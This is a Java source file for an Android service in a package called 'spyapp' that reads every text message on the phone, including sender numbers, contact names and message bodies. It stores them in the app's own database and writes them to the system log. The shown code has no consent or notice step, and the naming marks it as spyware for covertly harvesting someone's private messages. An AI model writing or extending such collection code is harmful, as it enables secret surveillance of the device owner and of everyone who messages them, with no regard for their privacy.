package com.app.spyapp.service;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Utils;
import com.app.spyapp.common.WriteLog;
import com.app.spyapp.model.SMSModel;

import java.util.ArrayList;


public class SmsService extends IntentService {
    private ArrayList<SMSModel> smsList = new ArrayList<SMSModel>();
    private SpyApp spyApp;
    private Long maxDate;

    public SmsService() {
        super(SmsService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Utils.showStatus(this, "SMS SERVICE");
        spyApp = (SpyApp) getApplicationContext();

        smsList = backupSMS();
        if (smsList != null && smsList.size() > 0) {
            for (int i = 0; i < smsList.size(); i++) {
                spyApp.getDatabaseHelper().insertSMS(smsList.get(i));
                Log.i("Debug", "SMS:"+i+"number="+smsList.get(i).getAddress()+"name="+smsList.get(i).getName()+"msg="+smsList.get(i).getMsg());
            }
        }
    }

    /**
     * get SMS Backup
     */
    private ArrayList<SMSModel> backupSMS() {
        ArrayList<SMSModel> smsList = new ArrayList<>();

        Uri mSmsinboxQueryUri = Uri.parse("content://sms");
        Cursor cursor1 = getContentResolver().query(
                mSmsinboxQueryUri,
                new String[]{"_id", "thread_id", "address", "person", "date",
                        "body", "type", "read"}, null, null, null);
        // startManagingCursor(cursor1);
        String[] columns = new String[]{"_id", "thread_id", "address",
                "person", "date", "body", "type", "read"};
        if (cursor1.getCount() > 0) {
            String count = Integer.toString(cursor1.getCount());
            Log.i("Debug", "Count SMS = "+count);
            while (cursor1.moveToNext()) {

                SMSModel info = new SMSModel();

                info.setMessageId(cursor1.getString(cursor1
                        .getColumnIndex(columns[0])));

                info.setThreadId(cursor1.getString(cursor1
                        .getColumnIndex(columns[1])));

                info.setAddress(cursor1.getString(cursor1
                        .getColumnIndex(columns[2])));
                info.setName(cursor1.getString(cursor1
                        .getColumnIndex(columns[3])));
                info.setDate(Utils.convertMilisToDate(Long.parseLong(cursor1.getString(cursor1
                        .getColumnIndex(columns[4])))));
                info.setMsg(cursor1.getString(cursor1
                        .getColumnIndex(columns[5])));
                if (cursor1.getInt(cursor1
                        .getColumnIndex(columns[6])) == Const.TYPE_SENT_INT) {
                    info.setType(Const.TYPE_SENT_STRING);
                } else {
                    info.setType(Const.TYPE_RECEIVE_STRING);
                }
                info.setRead(Integer.parseInt(cursor1.getString(cursor1
                        .getColumnIndex(columns[7]))));

                smsList.add(info);


            }

        }
        return smsList;
    }

}
